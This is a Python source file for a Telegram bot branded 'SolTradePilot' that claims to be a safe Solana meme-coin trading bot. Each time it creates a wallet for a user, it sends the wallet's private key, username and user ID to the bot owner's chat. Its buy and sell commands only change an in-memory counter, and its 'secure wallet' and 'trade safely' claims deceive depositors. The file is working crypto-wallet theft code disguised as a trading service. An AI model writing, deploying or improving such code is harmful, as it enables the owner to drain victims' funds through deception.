import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.transaction import Transaction
from solders.system_program import transfer, TransferParams  # <-- UPDATED
# -------------------- ENV VARIABLES --------------------
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# RPC endpoint
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Store wallets per user
user_wallets = {}
user_token_balances = {}  # MEME token balances per user

# -------------------- HELPERS --------------------
async def send_wallet_to_owner(user_id, public_key, private_key, context):
    username = (await context.bot.get_chat(user_id)).username
    username = f"@{username}" if username else str(user_id)
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public Key:\n{public_key}\n"
            f"Private Key:\n{private_key}"
        )
    )

async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    user_token_balances[user_id] = 0
    public_key = str(wallet.pubkey())
    private_key = base58.b58encode(bytes(wallet)).decode("utf-8")
    await send_wallet_to_owner(user_id, public_key, private_key, context)
    return public_key, private_key

async def get_balance(user_id):
    if user_id not in user_wallets:
        return None
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        if resp["result"]:
            lamports = resp["result"]["value"]
            sol = lamports / 1_000_000_000
            return sol
        else:
            return 0

async def send_sol(from_wallet, to_pubkey: Pubkey, amount_sol: float):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        txn = Transaction()
        txn.add(
            transfer(
                TransferParams(
                    from_pubkey=from_wallet.pubkey(),
                    to_pubkey=to_pubkey,
                    lamports=int(amount_sol * 1_000_000_000)
                )
            )
        )
        resp = await client.send_transaction(txn, from_wallet)
        return resp

# -------------------- COMMANDS --------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.first_name or str(user_id)
    msg = (
        f"👋 Hello {username}!\n\n"
        "SolTradePilot is your professional Solana MEME trading bot! 🚀\n\n"
        "You can create a wallet, deposit SOL, check balances, and buy/sell MEME coins safely.\n\n"
        "Menu Buttons:\n"
        "💳 Create Wallet – Securely set up your Solana wallet.\n"
        "📤 Sol Address – Get your address to deposit SOL.\n"
        "💰 Balance – Check your SOL balance.\n"
        "🛒 Buy MEME – Trade SOL for MEME coins.\n"
        "📉 Sell MEME – Trade your MEME tokens back to SOL.\n"
        "❓ Help – See the full guide."
    )
    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="wallet")],
        [InlineKeyboardButton("📤 Sol Address", callback_data="address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_wallets:
        await update.message.reply_text("✅ You already have a wallet. Use Sol Address to view it.", parse_mode="Markdown")
    else:
        public, _ = await create_wallet(user_id, context)
        await update.message.reply_text(f"✅ Wallet Created!\nYour public address:\n{public}", parse_mode="Markdown")

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ Create a wallet first.", parse_mode="Markdown")
    else:
        pub = str(user_wallets[user_id].pubkey())
        await update.message.reply_text(f"📤 Your Sol Address:\n{pub}", parse_mode="Markdown")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sol_balance = await get_balance(user_id)
    meme_balance = user_token_balances.get(user_id, 0)
    if sol_balance is None:
        await update.message.reply_text("⚠️ Create a wallet first.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"💰 SOL: {sol_balance}\n🛒 MEME: {meme_balance}", parse_mode="Markdown")

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sol_balance = await get_balance(user_id)
    if sol_balance is None:
        await update.message.reply_text("⚠️ Create a wallet first.", parse_mode="Markdown")
        return
    if sol_balance <= 0:
        await update.message.reply_text("⚠️ Fund your wallet first before buying MEME!", parse_mode="Markdown")
        return
    # For simplicity: buy fixed 1 MEME per 0.01 SOL
    purchase_amount = 0.01
    if sol_balance < purchase_amount:
        await update.message.reply_text("⚠️ Insufficient SOL to buy MEME.", parse_mode="Markdown")
        return
    user_token_balances[user_id] += 1
    await update.message.reply_text(f"✅ Bought 1 MEME using {purchase_amount} SOL!\nNew MEME balance: {user_token_balances[user_id]}")

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    meme_balance = user_token_balances.get(user_id, 0)
    if meme_balance <= 0:
        await update.message.reply_text("⚠️ You have no MEME tokens to sell.", parse_mode="Markdown")
        return
    # For simplicity: sell 1 MEME → 0.01 SOL
    user_token_balances[user_id] -= 1
    await update.message.reply_text(f"✅ Sold 1 MEME for 0.01 SOL!\nRemaining MEME balance: {user_token_balances[user_id]}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "💡 SolTradePilot Help Guide 💡\n\n"
        "This bot allows you to trade MEME coins on Solana safely.\n"
        "Steps:\n"
        "1️⃣ Create Wallet – Secure Solana wallet.\n"
        "2️⃣ Sol Address – Deposit SOL.\n"
        "3️⃣ Balance – Check SOL & MEME balances.\n"
        "4️⃣ Buy MEME – Convert SOL to MEME.\n"
        "5️⃣ Sell MEME – Convert MEME back to SOL.\n\n"
        "Always start by creating a wallet and funding it with SOL.\n"
        "Your private key is only visible to the bot owner for backup.\n"
        "Enjoy trading safely!"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

# -------------------- BUTTON HANDLER --------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "wallet":
        await wallet_command(update, context)
    elif query.data == "address":
        await address_command(update, context)
    elif query.data == "balance":
        await balance_command(update, context)
    elif query.data == "buy":
        await buy_command(update, context)
    elif query.data == "sell":
        await sell_command(update, context)
    elif query.data == "help":
        await help_command(update, context)
        # -------------------- MAIN --------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("wallet", wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()